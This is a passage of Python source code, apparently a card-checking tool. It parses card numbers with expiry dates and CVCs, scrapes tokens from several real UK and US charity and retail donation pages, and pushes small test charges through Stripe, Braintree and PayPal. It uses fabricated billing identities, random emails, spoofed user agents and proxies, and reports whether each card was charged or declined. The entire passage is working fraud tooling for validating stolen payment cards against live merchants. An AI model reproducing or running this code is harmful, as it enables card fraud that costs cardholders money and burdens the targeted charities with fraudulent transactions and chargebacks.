	    f'https://api.braintreegateway.com/merchants/ngnddb46gd6qtb7f/client_api/v1/payment_methods/{tokennsbrint}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	noncebrint=response.json()['paymentMethod']['nonce']
	
	headers = {
	    'authority': 'www.tonicsmenswear.co.uk',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.tonicsmenswear.co.uk',
	    'referer': 'https://www.tonicsmenswear.co.uk/checkout/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'cart_id': 'af4ca06437b34e5396856511ba2a0097',
	    'nonce': noncebrint,
	    'amount': '10',
	    'gateway': 'bt_card',
	    'dlv_id': '5',
	    'dlv_val': '0',
	    'firstname_d': 'Raph',
	    'surname_d': 'Alfa',
	    'addr1_d': 'London 1000',
	    'addr2_d': '',
	    'city_d': 'London',
	    'postcode_d': 'EX8 1AQ',
	    'country_d': 'United Kingdom#GB',
	    'countryCode': 'GB',
	    'email_d': 'raph@rhp.com',
	    'telephone_d': '02143269785',
	    'newsletter': '1',
	    'device_data': '{"correlation_id":"a8146d1896fd246b498465b8a2cb3bd5"}',
	}
	
	response = r.post(
	    'https://www.tonicsmenswear.co.uk/shop/braintree-callback.v2.php',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	#res = re.search(r"Transaction_status*=\s*'([^']+)'", response.text).group(1)
	#result=re.search(r"*=\s*'([^']+)'", response.text).group(1)
	pkp =response.json()["Transaction_status"]
	
	if 'gateway_rejected' in pkp:
		return 'gateway_rejected'
	elif 'submitted_for_settlement' in pkp:
		return 'Insufficient Funds'
	elif 'processor_declined' in pkp:
		return 'processor_declined',
	elif 'failed' in pkp:
		return 'failed'
	elif 'R_ERROR' in pkp:
		return 'R_ERROR'
	else:
		return pkp
def strip_charge(ccx):
	start_num = 0
	start_num += 1
	P = ccx.strip()
	parts = re.split('[:|/]', P)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	r=requests.Session()
	user = user_agent.generate_user_agent()
		
	def generate_random_account():
			name = ''.join(random.choices(string.ascii_lowercase, k=20))
			number = ''.join(random.choices(string.digits, k=4))
			return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
	def num():
			number = ''.join(random.choices(string.digits, k=7))
			return f"303{number}"
	num = (num())
		
	headers = {
	    'authority': 'jamesbrindleyfoundation.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'referer': 'https://jamesbrindleyfoundation.co.uk/ways-you-can-donate/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://jamesbrindleyfoundation.co.uk/donate/', headers=headers)
		
	check = re.search(r'var\s+wcOrderScript\s*=\s*\{.*?"nonce":"([^"]+)"', response.text).group(1)
		
	headers = {
	    'authority': 'jamesbrindleyfoundation.co.uk',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://jamesbrindleyfoundation.co.uk',
	    'referer': 'https://jamesbrindleyfoundation.co.uk/donate/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'donation_to_order',
	    'nonce': check,
	    'campaign_id': '44623',
	    'amount': '1',
	    'cause': '',
	    'type': 'shortcode',
	    'tribute': '',
	    'tribute_message': '',
	    'gift_aid': '',
	    'is_recurring': 'no',
	    'new_period': 'day',
	    'new_length': '1',
	    'new_interval': '1',
	}
	
	response = r.post(
	    'https://jamesbrindleyfoundation.co.uk/wp-admin/admin-ajax.php',
	    headers=headers,
	    data=data,
	)
	
	headers = {
	    'authority': 'jamesbrindleyfoundation.co.uk',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'referer': 'https://jamesbrindleyfoundation.co.uk/donate/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://jamesbrindleyfoundation.co.uk/checkout/', headers=headers)
	key =re.search(r'var\s+wc_stripe_params\s*=\s*\{[^}]*"key"\s*:\s*"([^"]+)"', response.text).group(1)
		
	sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
		
	nonce = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
		
	headers = {
	    'authority': 'jamesbrindleyfoundation.co.uk',
	    'accept': '*/*',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://jamesbrindleyfoundation.co.uk',
	    'referer': 'https://jamesbrindleyfoundation.co.uk/checkout/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'update_order_review',
	}
	
	data = {
	    'security': sec,
	    'payment_method': 'stripe',
	    'country': 'GB',
	    'state': '',
	    'postcode': 'RB37 1EL',
	    'city': 'Kingston upon Hull',
	    'address': '6362 Church Lane',
	    'address_2': '',
	    's_country': 'GB',
	    's_state': '',
	    's_postcode': 'RB37 1EL',
	    's_city': 'Kingston upon Hull',
	    's_address': '6362 Church Lane',
	    's_address_2': '',
	    'has_full_address': 'true',
	    'post_data': 'billing_first_name=Boda&billing_last_name=ElmargaWY&billing_company=&billing_country=GB&billing_address_1=6362%20Church%20Lane&billing_address_2=&billing_city=Kingston%20upon%20Hull&billing_state=&billing_postcode=RB37%201EL&billing_phone=017684%2065683&billing_email={acc}&order_comments=&payment_method=stripe&terms-field=1&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2Fcheckout%2F',
	}
	
	response = r.post('https://jamesbrindleyfoundation.co.uk/', params=params, cookies=r.cookies, headers=headers, data=data)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': user,
	}
	data = f'type=card&billing_details[name]=Boda+ElmargaWY&billing_details[address][line1]=6362+Church+Lane&billing_details[address][city]=Kingston+upon+Hull&billing_details[address][postal_code]=RB37+1EL&billing_details[address][country]=GB&billing_details[email]={acc}&billing_details[phone]=017684+65683&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=e290d6d5-60e5-459b-b1d3-5a6e54481c642d23c1&muid=765a6f89-e49b-4a9e-985e-1f7b4d15fedb1b2eb3&sid=7c85d097-fa39-4c4f-a63c-94c712757d8fc84ca9&payment_user_agent=stripe.js%2F5127fc55bb%3B+stripe-js-v3%2F5127fc55bb%3B+split-card-element&referrer=https%3A%2F%2Fjamesbrindleyfoundation.co.uk&client_attribution_metadata[client_session_id]=599ad99c-b780-4d88-8710-e2b662c8e0c9&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={key}'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=response.json()['id']
	headers = {
	    'authority': 'jamesbrindleyfoundation.co.uk',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-US,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://jamesbrindleyfoundation.co.uk',
	    'referer': 'https://jamesbrindleyfoundation.co.uk/checkout/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	params = {
	    'wc-ajax': 'checkout',
	}
	data = {
	    'billing_first_name': 'Boda',
	    'billing_last_name': 'ElmargaWY',
	    'billing_company': '',
	    'billing_country': 'GB',
	    'billing_address_1': '6362 Church Lane',
	    'billing_address_2': '',
	    'billing_city': 'Kingston upon Hull',
	    'billing_state': '',
	    'billing_postcode': 'RB37 1EL',
	    'billing_phone': '017684 65683',
	    'billing_email': acc,
	    'order_comments': '',
	    'payment_method': 'stripe',
	    'terms': 'on',
	    'terms-field': '1',
	    'woocommerce-process-checkout-nonce': nonce,
	    '_wp_http_referer': '/?wc-ajax=update_order_review',
	    'stripe_source': id,
	}
	response = r.post('https://jamesbrindleyfoundation.co.uk/', params=params, cookies=r.cookies, headers=headers, data=data)
	text = response.text
	if 'Thank you' in text or 'Thank you. Your order has been received.' in text or 'order has been received.' in text or 'Thank' in text:
		return 'charge'
	elif 'The card was declined.' in text or 'The card has been declined for an unknown reason.' in text:
		return 'card was declined'
	elif 'Your card number is incorrect.' in text:
		return 'card number is incorrect.'
	else:
		return text


def lookups(ccx):
	start_num = 0
	start_num += 1
	P = ccx.strip()
	parts = re.split('[:|/]', P)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	r=requests.Session()
	user=user_agent.generate_user_agent()
	headers = {
    'authority': 'secure.churchmissionsociety.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
	}
	
	response = r.get('https://secure.churchmissionsociety.org/giving/single.js', cookies=r.cookies, headers=headers)
	no=re.findall(r'authorization: "(.*?)"',response.text)[0]
	encoded_text = no
	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
	auth=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization': f'Bearer {auth}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'dropin2',
	        'sessionId': '618608cd-3a5d-4b50-bc8d-56322d1dd830',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	#{ { 'tokencc_bh_7rjkdp_gwtwj8_gtvsyb_gnjz9z_v95', 'creditCard': {
	dtok=response.json()['data']['tokenizeCreditCard']['token']
	
	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://secure.churchmissionsociety.org',
	    'referer': 'https://secure.churchmissionsociety.org/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'amount': '1',
	    'additionalInfo': {
	        'userAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
#	        'ipAddress': '10.0.0.50',
	        'acsWindowSize': '03',
	        'billingLine1': 'london 1000',
	        'billingLine2': '',
	        'billingCity': 'london',
	        'billingPostalCode': 'EX8 1AQ',
	        'billingCountryCode': 'GB',
	        'billingPhoneNumber': '02143269785',
	        'billingGivenName': 'raph',
	        'billingSurname': 'raph',
	        'email': 'raph@rhp.com',
	    },
	    'bin': n[0:6],
	    'dfReferenceId': '0_5f4e085d-8b13-4958-a055-60dab97f0c33',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.68.0',
	        'cardinalDeviceDataCollectionTimeElapsed': 2854,
	        'issuerDeviceDataCollectionTimeElapsed': 12629,
	        'issuerDeviceDataCollectionResult': False,
	    },
	    'authorizationFingerprint': auth,
	    'braintreeLibraryVersion': 'braintree/web/3.68.0',
	    '_meta': {
	        'merchantAppId': 'secure.churchmissionsociety.org',
	        'platform': 'web',
	        'sdkVersion': '3.68.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '618608cd-3a5d-4b50-bc8d-56322d1dd830',
	    },
	}
	
	response = requests.post(
	    f'https://api.braintreegateway.com/merchants/2ch7t8phm8x4dpwd/client_api/v1/payment_methods/{dtok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	
	status = (response.json()['paymentMethod']['threeDSecureInfo']['status'])
	if 'challenge_required' in status:
		return 'challenge_required'
	elif 'authenticate_attempt_successful' in status:
		return 'authenticate_attempt_successful'
	else:
		return status







#paypal_charge 5$

def paypal_Five(ccx):
	start_time = time.perf_counter()
	card = ccx.strip()
	parts = re.split(r'[:|/\\]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	if not card:
		pass
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		return f"{name}{number}@yahoo.com"
	acc = generate_random_account()
	r=requests.Session()
	user=user_agent.generate_user_agent()
	headers = {
		    'authority': 'folkgathering.com',
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'cache-control': 'max-age=0',
		    'referer': 'https://www.google.com/',
		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'document',
		    'sec-fetch-mode': 'navigate',
		    'sec-fetch-site': 'cross-site',
		    'sec-fetch-user': '?1',
		    'upgrade-insecure-requests': '1',
		    'user-agent': user,
		}
		
	response = r.get('https://folkgathering.com/donate/', headers=headers)
	auth = match = re.search(r'data-client-token="(ey[^"]+)"', response.text).group(1)
	dec=base64.b64decode(auth).decode('utf-8')
	toks = re.search(r'"accessToken":"(.*?)"', dec).group(1)
	fid = re.search(r'<input[^>]*name="wpforms\[id\]"[^>]*value="([^"]+)"', response.text).group(1)
	pid=  re.search(r'<input[^>]* name="page_id"[^>]*value="([^"]+)"', response.text).group(1)
	postid = re.search(r'<input[^>]*name="wpforms\[post_id\]"[^>]*value="([^"]+)"', response.text).group(1)
	nonce=match = re.search(r'"nonces"\s*:\s*\{\s*"create"\s*:\s*"([^"]+)"', response.text).group(1)
	dtk = re.search(r'<form[^>]*data-token="([^"]+)"', response.text).group(1)
		
	data = MultipartEncoder({
		    'wpforms[fields][0][first]': (None, 'raph'),
		    'wpforms[fields][0][last]': (None, 'raph'),
		    'wpforms[fields][8]': (None, 'No'),
		    'wpforms[fields][1]': (None, acc),
		    'wpf-temp-wpforms[fields][6]': (None, '2143269785'),
		    'wpforms[fields][6]': (None, '2143269785'),
		    'wpforms[fields][7]': (None, 'One Time'),
		    'wpforms[fields][2]': (None, '1'),
		    'wpforms[fields][10]': (None, "Use my donation wherever it's needed most"),
		    'wpforms[fields][4]': (None, 'No'),
		    'wpforms[fields][5]': (None, ''),
		    'wpforms[fields][11][orderID]': (None, ''),
		    'wpforms[fields][11][subscriptionID]': (None, ''),
		    'wpforms[fields][11][source]': (None, ''),
		    'wpforms[fields][11][cardname]': (None, 'Raphael j marten'),
		    'wpforms[id]': (None, fid),
		    'page_title': (None, 'Donate'),
		    'page_url': (None, 'https://folkgathering.com/donate/'),
		    'url_referer': (None, 'https://www.google.com/'),
		    'page_id': (None, pid),
		    'wpforms[post_id]': (None, postid),
		    'total': (None, '1'),
		    'is_checkout': (None, 'false'),
		    'nonce': (None, nonce),
		})
	headers = {
		    'authority': 'folkgathering.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': data.content_type,
		    'origin': 'https://folkgathering.com',
		    'referer': 'https://folkgathering.com/donate/',
		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': user,
		}
		
	params = {
		    'action': 'wpforms_paypal_commerce_create_order',
		}
		
		
		
	response = r.post(
		    'https://folkgathering.com/wp-admin/admin-ajax.php',
		    params=params,
		    cookies=r.cookies,
		    headers=headers,
		    data=data,
		)
		
	id=(response.json()['data']['id'])
		
		
	headers = {
		    'authority': 'cors.api.paypal.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'authorization': f'Bearer {toks}',
		    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
		    'content-type': 'application/json',
		    'origin': 'https://assets.braintreegateway.com',
	
		    'referer': 'https://assets.braintreegateway.com/',
		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'cross-site',
		    'user-agent': user,
		}
		
	json_data = {
		    'payment_source': {
		        'card': {
		            'number': n,
		            'expiry': f'20{yy[-2:]}-{mm.zfill(2)}',
		            'security_code': cvc,
		            'name': 'Raphael j marten',
		            'attributes': {
		                'verification': {
		                    'method': 'SCA_WHEN_REQUIRED',
		                },
		            },
		        },
		    },
		    'application_context': {
		        'vault': False,
		    },
		}
		
	response = r.post(
		    f'https://cors.api.paypal.com/v2/checkout/orders/{id}/confirm-payment-source',
		    headers=headers,
		    json=json_data,
		)
	t= time.perf_counter() - start_time
	if response.json().get("status") and "'status': 'APPROVED'":
		start_timestamp = int(time.time())
		ordid = response.json()['id']
		end_timestamp = start_timestamp + 120
		data = MultipartEncoder({
		    'wpforms[fields][0][first]': (None, 'raph'),
		    'wpforms[fields][0][last]': (None, 'raph'),
		    'wpforms[fields][8]': (None, 'No'),
		    'wpforms[fields][1]': (None, acc),
		    'wpforms[fields][6]': (None, '+12143269785'),
		    'wpforms[fields][7]': (None, 'One Time'),
		    'wpforms[fields][2]': (None, '1'),
		    'wpforms[fields][10]': (None, "Use my donation wherever it's needed most"),
		    'wpforms[fields][4]': (None, 'No'),
		    'wpforms[fields][5]': (None, ''),
		    'wpforms[fields][11][orderID]': (None, ordid),
		    'wpforms[fields][11][subscriptionID]': (None, ''),
		    'wpforms[fields][11][source]': (None, ''),
		    'wpforms[fields][11][cardname]': (None, 'Raphael j marten'),
		    'wpforms[id]': (None, fid),
		    'page_title': (None, 'Donate'),
		    'page_url': (None, 'https://folkgathering.com/donate/'),
		    'url_referer': (None, 'https://www.google.com/'),
		    'page_id': (None, pid),
		    'wpforms[post_id]': (None, postid),
		    'wpforms[token]': (None, dtk),
		    'action': (None, 'wpforms_submit'),
		    'start_timestamp': (None, f'{start_timestamp}'),
		    'end_timestamp': (None, f'{end_timestamp}'),
		})
		headers = {
		    'authority': 'folkgathering.com',
		    'accept': 'application/json, text/javascript, */*; q=0.01',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': data.content_type,
		    'origin': 'https://folkgathering.com',
		    'referer': 'https://folkgathering.com/donate/',
		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': user,
		    'x-requested-with': 'XMLHttpRequest',
		}
		
		response = r.post('https://folkgathering.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
		
		msg = re.search(r'<p[^>]*>(.*?)<\\/p>', response.text, re.DOTALL)
		if "This payment cannot be processed because it was declined by payment processor." in msg.group(1).strip():
			return 'declined_by_processor'
		else:
			print(response.text)
			return 'new'

	else:
		des= json.loads(response.text)
		if des.get("details", [{}])[0].get("issue"):
				return des.get("details", [{}])[0].get("issue")

		elif des.get("details", [{}])[0].get("message") :
			return des.get("details", [{}])[0].get("message")


		elif des.get("message") :
			return des.get("message")

		else:
			print(response.text)
			return 'unknown'

			
			
def ppc(ccx):
	card = ccx.strip()
	if not card:
		return 'Skiped invalid card'
	else:
		if card.startswith("493875"):
			return 'blocked'
		else:
			parts = re.split(r'[|/:\\]+', card)
			parts = parts[:4]
			cc = parts[0].strip()
			mm = parts[1].strip()
			yy = parts[2].strip()
			cvc = parts[3].strip() 
			proxies_list = load_proxies("proxies.txt")
			proxy_line = random.choice(proxies_list)
			proxies = build_proxy(proxy_line)
			user =user_agent.generate_user_agent()
			r=requests.Session()
			r.proxies.update(proxies)
			def genaccount():
				name = ''.join(random.choices(string.ascii_lowercase, k=20))
				number = ''.join(random.choices(string.digits, k=4))
				return f"{name}{number}@rhp.com"
			acc=genaccount()
			headers = {
			    'authority': 'peyoteway.org',
			    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			    'cache-control': 'max-age=0',
			    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-platform': '"Android"',
			    'sec-fetch-dest': 'document',
			    'sec-fetch-mode': 'navigate',
			    'sec-fetch-site': 'none',
			    'sec-fetch-user': '?1',
			    'upgrade-insecure-requests': '1',
			    'user-agent': user,
			}
			
			response = r.get('https://peyoteway.org/', headers=headers)
			#Start
			headers = {
			    'Referer': 'https://peyoteway.org/',
			    'Upgrade-Insecure-Requests': '1',
			    'User-Agent': user,
			    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-platform': '"Android"',
			}
			
			response = r.get('https://peyoteway.org/sustainable-peyotism-donate/', headers=headers)
			
			pref = re.search(r'<input[^>]*name="give-form-id-prefix"[^>]*value="([^"]+)"',response.text
			).group(1)
			fid =re.search(r'<input[^>]*name="give-form-id"[^>]*value="(\d+)"',
			    response.text).group(1)
			hase=re.search(r'<input[^>]*name="give-form-hash"[^>]*value="([^"]+)"',response.text).group(1)
			#token
			enc_token = re.search(r'"data-client-token"\s*:\s*"([^"]+)"',response.text)
			if enc_token:
				dec = base64.b64decode(enc_token.group(1)).decode('utf-8')
				toks = re.search(r'"accessToken":"(.*?)"', dec).group(1)
				
				#succsess
				headers = {
				    'authority': 'peyoteway.org',
				    'accept': '*/*',
				    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
				    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
				    'origin': 'https://peyoteway.org',
				    'referer': 'https://peyoteway.org/sustainable-peyotism-donate/',
				    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
				    'sec-ch-ua-mobile': '?1',
				    'sec-ch-ua-platform': '"Android"',
				    'sec-fetch-dest': 'empty',
				    'sec-fetch-mode': 'cors',
				    'sec-fetch-site': 'same-origin',
				    'user-agent': user,
				    'x-requested-with': 'XMLHttpRequest',
				}
				
				data = {
				    'give-honeypot': '',
				    'give-form-id-prefix': pref,
				    'give-form-id': fid,
				    'give-form-title': 'Donate Now to Support Sustainable Peyotism',
				    'give-current-url': 'https://peyoteway.org/sustainable-peyotism-donate/',
				    'give-form-url': 'https://peyoteway.org/sustainable-peyotism-donate/',
				    'give-form-minimum': '1.00',
				    'give-form-maximum': '999999.99',
				    'give-form-hash': hase,
				    'give-price-id': 'custom',
				    'give-recurring-logged-in-only': '',
				    'give-logged-in-only': '1',
				    'give_recurring_donation_details': '{"is_recurring":false}',
				    'give-amount': '1.00',
				    'give-radio-donation-level': 'custom',
				    'payment-mode': 'paypal-commerce',
				    'give_first': 'raph',
				    'give_last': 'raph',
				    'give_email': acc,
				    'give_comment': '',
				    'card_name': 'Raphael',
				    'card_exp_month': '',
				    'card_exp_year': '',
				    'give_action': 'purchase',
				    'give-gateway': 'paypal-commerce',
				    'action': 'give_process_donation',
				    'give_ajax': 'true',
				}
				
				response = r.post('https://peyoteway.org/nov2019wp/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
				if "success" in response.text:
					data = MultipartEncoder({
					    'give-honeypot': (None, ''),
					    'give-form-id-prefix': (None, pref),
					    'give-form-id': (None, fid),
					    'give-form-title': (None, 'Donate Now to Support Sustainable Peyotism'),
					    'give-current-url': (None, 'https://peyoteway.org/sustainable-peyotism-donate/'),
					    'give-form-url': (None, 'https://peyoteway.org/sustainable-peyotism-donate/'),
					    'give-form-minimum': (None, '1.00'),
					    'give-form-maximum': (None, '999999.99'),
					    'give-form-hash': (None, hase),
					    'give-price-id': (None, 'custom'),
					    'give-recurring-logged-in-only': (None, ''),
					    'give-logged-in-only': (None, '1'),
					    'give_recurring_donation_details': (None, '{"is_recurring":false}'),
					    'give-amount': (None, '1.00'),
					    'give-radio-donation-level': (None, 'custom'),
					    'payment-mode': (None, 'paypal-commerce'),
					    'give_first': (None, 'raph'),
					    'give_last': (None, 'raph'),
					    'give_email': (None, acc),
					    'give_comment': (None, ''),
					    'card_name': (None, 'Raphael'),
					    'card_exp_month': (None, ''),
					    'card_exp_year': (None, ''),
					    'give-gateway': (None, 'paypal-commerce'),
					})
					headers = {
					    'authority': 'peyoteway.org',
					    'accept': '*/*',
